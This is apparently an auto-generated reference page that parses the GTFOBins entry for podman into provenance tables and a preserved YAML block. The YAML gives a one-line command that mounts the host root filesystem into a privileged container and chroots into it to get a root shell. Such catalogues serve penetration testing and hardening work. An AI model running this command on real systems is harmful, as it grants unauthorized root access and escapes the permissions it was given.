---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# podman

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `podman` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/podman` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [podman](../../tools/linux/podman.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | podman |
| name | podman |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/podman/ |

## Preserved Source Material

```yaml
_body: ''
_name: podman
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/podman
functions:
  shell:
  - code: podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh
    comment: This requires an actual image to be available (e.g., `alpine`) downloading it if not present.
    contexts:
      sudo: null
      unprivileged: null
```
